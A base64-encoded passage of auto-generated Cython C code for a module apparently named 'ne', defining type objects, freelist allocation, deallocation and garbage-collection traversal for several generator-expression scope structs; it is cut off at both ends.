HJ1Y3RfX2dlbmV4cHJ9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjID0gewogICJuZS5fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIiLAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLAogIF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0gewogIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKQogICJuZS4iIl9fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciIsIAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIAogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgX19weXhfdHBfdHJhdmVyc2VfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAwLCAKICAjZWxzZQogIE5VTEwsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMCkKICAwLCAKICAjZW5kaWYKICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDEKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMAogIDAsIAogICNlbmRpZgp9OwojZW5kaWYKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKSkpIHsKICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByXTsKICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpOwogICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7CiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7CiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDsKICB9CiAgI2VuZGlmCiAgcmV0dXJuIG87Cn0KCnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlPYmplY3QgKm8pIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilvOwogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHsKICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIHsKICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuOwogICAgfQogIH0KICAjZW5kaWYKICBQeU9iamVjdF9HQ19VblRyYWNrKG8pOwogIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7CiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpKSkgewogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTsKICAgICNlbHNlCiAgICB7CiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7CiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pOwogICAgfQogICAgI2VuZGlmCiAgfQp9CgpzdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkgewogIGludCBlOwogIHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKW87CiAgewogICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTsKICAgIGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF92X2kpIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfaSwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgcmV0dXJuIDA7Cn0KI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zbG90c1tdID0gewogIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LAogIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc3BlYyA9IHsKICAibmUuX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLAogIF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHMsCn07CiNlbHNlCgpzdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSB7CiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApCiAgIm5lLiIiX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciIsIAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSwgCiAgMCwgCiAgX19weXhfdHBfZGVhbGxvY18ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgCiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCAKICAwLCAKICBfX3B5eF90cF90cmF2ZXJzZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHsKICBQeU9iamVjdCAqbzsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7CiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7CiAgI2Vsc2UKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKSB7CiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKTsKICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpOwogICAgUHlPYmplY3RfR0NfVHJhY2sobyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvKSB7CiAgc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7CiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSB7CiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjsKICAgIH0KICB9CiAgI2VuZGlmCiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTsKICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBQeV9DTEVBUihwLT5fX3B5eF92X2kpOwogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQoKc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHsKICBpbnQgZTsKICBzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvOwogIHsKICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7CiAgICBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfdl9pKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X2ksIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIHJldHVybiAwOwp9CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc2xvdHNbXSA9IHsKICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSwKICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LAogIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSwKICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMgPSB7CiAgIm5lLl9fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIiLAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSwKICAwLAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwKICBfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzLAp9OwojZWxzZQoKc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0gewogIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKQogICJuZS4iIl9fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIiLCAKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksIAogIDAsIAogIF9fcHl4X3RwX2RlYWxsb2NfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIAogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgX19weXhfdHBfdHJhdmVyc2VfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgX19weXhfdHBfbmV3XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIDAsIAogICNlbHNlCiAgTlVMTCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwKQogIDAsIAogICNlbmRpZgogICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMQogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAwLCAKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwCiAgMCwgCiAgI2VuZGlmCn07CiNlbmRpZgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7CiAgUHlPYmplY3QgKm87CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpOwogIG8gPSBhbGxvY19mdW5jKHQsIDApOwogICNlbHNlCiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpKSkgewogICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJbLS1